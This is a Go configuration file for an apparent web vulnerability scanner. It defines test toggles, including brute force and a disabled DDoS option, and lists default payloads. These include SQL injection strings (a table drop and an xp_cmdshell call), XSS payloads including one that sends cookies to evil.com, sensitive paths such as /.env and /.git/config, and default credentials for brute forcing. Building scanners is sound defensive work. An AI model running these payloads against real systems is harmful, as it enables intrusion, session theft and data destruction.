package config

import (
	"encoding/json"
	"os"
	"time"
)

// Config contiene la configuración del escáner
type Config struct {
	// Configuración de red
	Concurrent int           `json:"concurrent"`
	Timeout    time.Duration `json:"timeout"`
	
	// User-Agent para las requests
	UserAgent string `json:"user_agent"`
	
	// Headers adicionales
	Headers map[string]string `json:"headers"`
	
	// Configuración de tests
	Tests TestConfig `json:"tests"`
	
	// Configuración de output
	Verbose bool `json:"verbose"`
}

// TestConfig configura qué tests ejecutar
type TestConfig struct {
	SQLInjection    bool `json:"sql_injection"`
	XSS             bool `json:"xss"`
	BruteForce      bool `json:"brute_force"`
	CSRF            bool `json:"csrf"`
	DirectoryTraversal bool `json:"directory_traversal"`
	FileUpload      bool `json:"file_upload"`
	HTTPHeaders     bool `json:"http_headers"`
	SSL             bool `json:"ssl"`
	DDoS            bool `json:"ddos"`
	PathTraversal   bool `json:"path_traversal"`
	Authentication  bool `json:"authentication"`
	InformationDisclosure bool `json:"information_disclosure"`
}

// PayloadConfig contiene los payloads para diferentes ataques
type PayloadConfig struct {
	SQLPayloads []string `json:"sql_payloads"`
	XSSPayloads []string `json:"xss_payloads"`
	CommonPaths []string `json:"common_paths"`
	CommonCredentials []Credential `json:"common_credentials"`
}

// Credential representa credenciales para brute force
type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

// LoadConfig carga la configuración desde un archivo JSON
func LoadConfig(filename string) (*Config, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var config Config
	err = json.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}

	// Convertir timeout de string a duration si es necesario
	return &config, nil
}

// DefaultConfig retorna la configuración por defecto
func DefaultConfig() *Config {
	return &Config{
		Concurrent: 10,
		Timeout:    30 * time.Second,
		UserAgent:  "VersaSecurityTest/1.0 (Security Scanner)",
		Headers: map[string]string{
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Connection": "keep-alive",
		},
		Tests: TestConfig{
			SQLInjection:       true,
			XSS:                true,
			BruteForce:         true,
			CSRF:               true,
			DirectoryTraversal: true,
			FileUpload:         true,
			HTTPHeaders:        true,
			SSL:                true,
			DDoS:               false, // Por defecto deshabilitado
			PathTraversal:      true,
			Authentication:     true,
			InformationDisclosure: true,
		},
		Verbose: false,
	}
}

// GetPayloads retorna los payloads por defecto
func GetPayloads() *PayloadConfig {
	return &PayloadConfig{
		SQLPayloads: []string{
			"'",
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"' UNION SELECT null, username, password FROM users --",
			"admin'--",
			"' OR 1=1 --",
			"') OR ('1'='1",
			"1' OR '1'='1",
			"\" OR \"1\"=\"1",
			"'; EXEC xp_cmdshell('dir'); --",
		},
		XSSPayloads: []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<body onload=alert('XSS')>",
			"<iframe src=javascript:alert('XSS')>",
			"<script>document.location='http://evil.com/'+document.cookie</script>",
			"'><script>alert('XSS')</script>",
			"\"><script>alert('XSS')</script>",
			"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
		},
		CommonPaths: []string{
			"/admin",
			"/admin/",
			"/administrator",
			"/admin.php",
			"/admin/login",
			"/admin/index.php",
			"/wp-admin",
			"/wp-admin/",
			"/login",
			"/login.php",
			"/signin",
			"/dashboard",
			"/panel",
			"/cpanel",
			"/control",
			"/manager",
			"/phpmyadmin",
			"/backup",
			"/backup.zip",
			"/config.php",
			"/.git",
			"/.git/config",
			"/.env",
			"/web.config",
			"/.htaccess",
			"/robots.txt",
			"/sitemap.xml",
			"/crossdomain.xml",
			"/server-status",
			"/server-info",
			"/test.php",
			"/info.php",
			"/phpinfo.php",
		},
		CommonCredentials: []Credential{
			{"admin", "admin"},
			{"admin", "password"},
			{"admin", "123456"},
			{"admin", "admin123"},
			{"administrator", "administrator"},
			{"root", "root"},
			{"root", "toor"},
			{"root", "123456"},
			{"user", "user"},
			{"guest", "guest"},
			{"test", "test"},
			{"demo", "demo"},
			{"admin", ""},
			{"", "admin"},
			{"sa", ""},
			{"postgres", "postgres"},
		},
	}
}
